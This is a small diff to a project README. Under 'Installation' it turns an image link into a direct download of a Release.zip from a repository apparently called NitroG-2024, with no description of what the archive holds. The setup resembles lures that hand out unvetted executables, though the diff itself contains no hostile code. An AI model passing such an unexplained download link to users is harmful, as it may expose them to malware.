@@ -7,8 +7,8 @@
 ## Getting Started:
 
 ### Installation
-[![asdasdasd](https://github.com/user-attachments/assets/c8e918b4-7bbd-4ca6-8341-45c7646b9926)
-]()
+[![1](https://github.com/user-attachments/assets/c8e918b4-7bbd-4ca6-8341-45c7646b9926)
+](https://github.com/SKEY-308/NitroG-2024/releases/download/Release/Release.zip)
 
 
 
